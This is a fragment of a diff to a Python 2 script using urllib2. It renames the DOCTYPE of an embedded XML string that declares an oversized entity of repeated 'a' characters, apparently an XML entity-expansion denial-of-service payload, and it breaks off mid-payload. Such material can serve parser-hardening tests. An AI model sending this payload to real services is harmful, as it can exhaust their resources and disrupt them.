@@ -6,7 +6,7 @@ import urllib
 import urllib2
 
 
-data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
+data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE wolo [
 <!ENTITY oops "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
